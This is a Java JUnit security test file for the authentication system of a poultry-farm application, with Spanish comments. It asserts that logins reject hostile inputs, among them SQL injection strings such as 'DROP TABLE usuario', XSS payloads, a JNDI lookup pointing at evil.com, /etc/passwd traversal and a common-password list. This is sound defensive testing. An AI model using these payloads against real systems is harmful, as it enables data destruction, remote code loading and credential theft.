package security;

import DAO.Autenticar;
import DAO.UsuarioDAO;
import Modelo.Usuario;
import Util.PasswordUtil;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.DisplayName;
import static org.junit.jupiter.api.Assertions.*;

/**
 * Pruebas de seguridad para el sistema de autenticación.
 * Estas pruebas verifican la robustez del sistema contra ataques comunes.
 * 
 * @author Sistema Avícola - Security Team
 */
public class AuthenticationSecurityTest {

  @BeforeEach
  void setUp() {
    // Preparar datos de prueba si es necesario
  }

  @Test
  @DisplayName("Prueba de inyección SQL en email")
  void testSQLInjectionInEmail() {
    // Intentos de inyección SQL comunes
    String[] sqlInjectionAttempts = {
        "admin'; DROP TABLE usuario; --",
        "' OR '1'='1",
        "admin' OR 1=1 --",
        "'; SELECT * FROM usuario; --",
        "admin'/**/OR/**/1=1--",
        "admin' UNION SELECT * FROM usuario --"
    };

    for (String maliciousEmail : sqlInjectionAttempts) {
      boolean result = Autenticar.autenticar(maliciousEmail, "password123");
      assertFalse(result,
          "El sistema permitió autenticación con inyección SQL: " + maliciousEmail);
    }
  }

  @Test
  @DisplayName("Prueba de inyección SQL en contraseña")
  void testSQLInjectionInPassword() {
    String[] sqlInjectionAttempts = {
        "password'; DROP TABLE usuario; --",
        "' OR '1'='1",
        "password' OR 1=1 --",
        "'; SELECT * FROM usuario; --",
        "password'/**/OR/**/1=1--"
    };

    for (String maliciousPassword : sqlInjectionAttempts) {
      boolean result = Autenticar.autenticar("admin@avicola.com", maliciousPassword);
      assertFalse(result,
          "El sistema permitió autenticación con inyección SQL: " + maliciousPassword);
    }
  }

  @Test
  @DisplayName("Prueba de fuerza bruta con credenciales inválidas")
  void testBruteForceAttack() {
    String[] commonPasswords = {
        "123456", "password", "admin", "123456789", "qwerty",
        "abc123", "password123", "admin123", "letmein", "welcome"
    };

    String email = "admin@avicola.com";
    int failedAttempts = 0;

    for (String password : commonPasswords) {
      boolean result = Autenticar.autenticar(email, password);
      if (!result) {
        failedAttempts++;
      }
    }

    // Verificar que la mayoría de contraseñas comunes fallaron
    assertTrue(failedAttempts >= 9,
        "El sistema debe rechazar la mayoría de contraseñas débiles comunes");
  }

  @Test
  @DisplayName("Prueba de validación de entrada con caracteres especiales")
  void testSpecialCharactersInInput() {
    String[] specialInputs = {
        "<script>alert('XSS')</script>",
        "javascript:alert(1)",
        "<img src=x onerror=alert(1)>",
        "' AND 1=1 --",
        "${jndi:ldap://evil.com/a}",
        "../../../etc/passwd"
    };

    for (String specialInput : specialInputs) {
      // Probar tanto en email como en contraseña
      boolean emailResult = Autenticar.autenticar(specialInput, "password123");
      boolean passwordResult = Autenticar.autenticar("test@avicola.com", specialInput);

      assertFalse(emailResult,
          "El sistema permitió caracteres especiales en email: " + specialInput);
      assertFalse(passwordResult,
          "El sistema permitió caracteres especiales en contraseña: " + specialInput);
    }
  }

  @Test
  @DisplayName("Prueba de longitud excesiva de entrada")
  void testExcessiveInputLength() {
    // Crear cadenas muy largas para probar desbordamiento de buffer
    String longEmail = "a".repeat(10000) + "@test.com";
    String longPassword = "p".repeat(10000);

    assertDoesNotThrow(() -> {
      boolean result1 = Autenticar.autenticar(longEmail, "password123");
      boolean result2 = Autenticar.autenticar("test@avicola.com", longPassword);

      assertFalse(result1, "El sistema permitió email excesivamente largo");
      assertFalse(result2, "El sistema permitió contraseña excesivamente larga");
    }, "El sistema falló con entradas excesivamente largas");
  }

  @Test
  @DisplayName("Prueba de entradas nulas o vacías")
  void testNullAndEmptyInputs() {
    // Probar con valores nulos
    assertDoesNotThrow(() -> {
      boolean result1 = Autenticar.autenticar(null, "password123");
      boolean result2 = Autenticar.autenticar("test@avicola.com", null);
      boolean result3 = Autenticar.autenticar(null, null);

      assertFalse(result1, "El sistema permitió email nulo");
      assertFalse(result2, "El sistema permitió contraseña nula");
      assertFalse(result3, "El sistema permitió ambos valores nulos");
    }, "El sistema falló con entradas nulas");

    // Probar con valores vacíos
    assertDoesNotThrow(() -> {
      boolean result1 = Autenticar.autenticar("", "password123");
      boolean result2 = Autenticar.autenticar("test@avicola.com", "");
      boolean result3 = Autenticar.autenticar("", "");

      assertFalse(result1, "El sistema permitió email vacío");
      assertFalse(result2, "El sistema permitió contraseña vacía");
      assertFalse(result3, "El sistema permitió ambos valores vacíos");
    }, "El sistema falló con entradas vacías");
  }

  @Test
  @DisplayName("Prueba de espacios en blanco y caracteres invisibles")
  void testWhitespaceAndInvisibleCharacters() {
    String[] whitespaceInputs = {
        "   admin@avicola.com   ", // Espacios
        "\t\tadmin@avicola.com\t\t", // Tabs
        "\n\nadmin@avicola.com\n\n", // Nuevas líneas
        "\u200Badmin@avicola.com\u200B", // Zero-width space
        "\u00A0admin@avicola.com\u00A0" // Non-breaking space
    };

    for (String input : whitespaceInputs) {
      boolean result = Autenticar.autenticar(input, "password123");
      // Dependiendo de la implementación, esto podría ser true o false
      // Lo importante es que no cause excepciones
      assertDoesNotThrow(() -> Autenticar.autenticar(input, "password123"),
          "El sistema falló con caracteres de espacio: " + input.replace("\n", "\\n").replace("\t", "\\t"));
    }
  }

  @Test
  @DisplayName("Verificación de robustez del hash de contraseñas")
  void testPasswordHashingSecurity() {
    String password = "TestPassword123!";

    // Verificar que el hash es diferente en cada llamada (salt aleatorio)
    String hash1 = PasswordUtil.encryptPassword(password);
    String hash2 = PasswordUtil.encryptPassword(password);

    assertNotEquals(hash1, hash2,
        "Los hashes de la misma contraseña son idénticos (falta salt aleatorio)");

    // Verificar que ambos hashes son válidos para la misma contraseña
    assertTrue(PasswordUtil.verifyPassword(password, hash1),
        "El primer hash no verifica correctamente");
    assertTrue(PasswordUtil.verifyPassword(password, hash2),
        "El segundo hash no verifica correctamente");

    // Verificar que la contraseña incorrecta falla
    assertFalse(PasswordUtil.verifyPassword("WrongPassword", hash1),
        "Contraseña incorrecta fue aceptada");
  }

  @Test
  @DisplayName("Prueba de diferentes codificaciones de caracteres")
  void testCharacterEncodingAttacks() {
    String[] encodingAttacks = {
        "admin%40avicola.com", // URL encoding
        "admin@avicola%2ecom", // URL encoding del punto
        "ä̧d̡m̢i̧n̨@̧ä̡v̢i̧c̨o̧l̡ä̢.̧c̨o̧m̡", // Unicode con diacríticos
        "admin@avicola.com\u0000", // Null byte
        "admin@avicola.com\u001F", // Carácter de control
    };

    for (String encodedInput : encodingAttacks) {
      assertDoesNotThrow(() -> {
        boolean result = Autenticar.autenticar(encodedInput, "password123");
        // No debería autenticar con estos inputs codificados
        assertFalse(result,
            "El sistema permitió autenticación con encoding malicioso: " + encodedInput);
      }, "El sistema falló con ataque de codificación: " + encodedInput);
    }
  }
}
